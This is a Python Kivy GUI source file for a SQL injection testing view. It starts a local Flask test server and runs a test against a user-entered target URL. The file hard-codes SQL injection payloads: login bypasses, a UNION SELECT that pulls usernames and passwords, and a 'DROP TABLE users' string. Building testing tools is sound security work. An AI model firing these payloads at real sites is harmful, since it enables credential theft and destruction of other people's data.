import threading
import subprocess
import os
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.widget import Widget

from attacks.sql_injection.global_variables import target_url
from attacks.sql_injection.main import sql_injection_test
from gui.global_variables import default_button_height, default_padding_1
from gui.utils.console_view import ConsoleView
from gui.utils.custom_layout import CustomHeightLayout
from gui.utils.text_input_widget import TextInputWidget


class SqlInjectionView(BoxLayout):
    def __init__(self, console_view: ConsoleView, **kwargs):
        self.console_view = console_view
        super(SqlInjectionView, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 10
        self.spacing = 10

        # Initialize the server process variable
        self.server_process = None

        # Add URL View at the top
        self.url_view = TextInputWidget(target_url, "Target URL", "URL of the website")
        self.add_widget(self.url_view)

        # Add a spacer to push buttons to the bottom
        self.add_widget(BoxLayout(size_hint_y=1))  # Spacer

        # Button layout at the bottom using CustomHeightLayout
        button_layout = BoxLayout(orientation='vertical', size_hint_y=None)

        # Start Flask Server Button
        start_server_layout = CustomHeightLayout(height=default_button_height)
        self.start_server_button = Button(text="Start Test Server")
        self.start_server_button.bind(on_press=self.start_server)
        start_server_layout.add_widget(self.start_server_button)
        button_layout.add_widget(start_server_layout)

        # Stop Flask Server Button
        stop_server_layout = CustomHeightLayout(height=default_button_height)
        self.stop_server_button = Button(text="Stop Test Server")
        self.stop_server_button.bind(on_press=self.stop_server)
        stop_server_layout.add_widget(self.stop_server_button)
        button_layout.add_widget(stop_server_layout)

        # Add Start SQL Injection Button
        start_button_layout = CustomHeightLayout(height=default_button_height)
        self.start_button = Button(text="Start SQL Injection Test")
        self.start_button.bind(on_press=self.start_sql_injection_thread)
        start_button_layout.add_widget(self.start_button)
        button_layout.add_widget(start_button_layout)

        # Add a spacer between buttons
        button_layout.add_widget(Widget(size_hint_y=None, height=default_padding_1))

        # Add the button layout to the main view
        self.add_widget(button_layout)

    def start_server(self, instance):
        if self.server_process is None or self.server_process.poll() is not None:
            self.console_view.add_text_schedule("Starting Flask Test Server...")
            self.server_process = subprocess.Popen(
                ["python", "-m", "flask", "run", "--port=8080"],
                env={**os.environ, "FLASK_APP": "attacks/sql_injection/flask_server.py"},
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            self.console_view.add_text_schedule("[INFO] Flask Test Server started on http://localhost:8080")
        else:
            self.console_view.add_text_schedule("[INFO] Server is already running.")

    def stop_server(self, instance):
        """Stop the Flask server."""
        if self.server_process and self.server_process.poll() is None:
            self.console_view.add_text_schedule("[INFO] Stopping Flask Test Server...")
            self.server_process.terminate()
            self.server_process.wait()
            self.console_view.add_text_schedule("[INFO] Flask Test Server stopped.")
            self.server_process = None
        else:
            self.console_view.add_text_schedule("[INFO] No server is currently running.")

    def start_sql_injection_thread(self, instance):
        threading.Thread(target=self.start_sql_injection, daemon=True).start()

    def start_sql_injection(self):
        url = self.url_view.get_text().strip()

        # Validate the URL
        if not url:
            self.console_view.add_text_schedule("[ERROR] Please enter a valid Target URL before starting the test.")
            return

        self.console_view.add_text_schedule(f"Starting SQL Injection Test on {url}")

        # Define parameters and payloads
        parameters = {"username": "test", "password": "test"}
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, username, password FROM users --",
            "'; DROP TABLE users; --",
            "admin' --"
        ]

        # Run the SQL Injection test
        sql_injection_test(url, parameters, payloads, self.console_view)
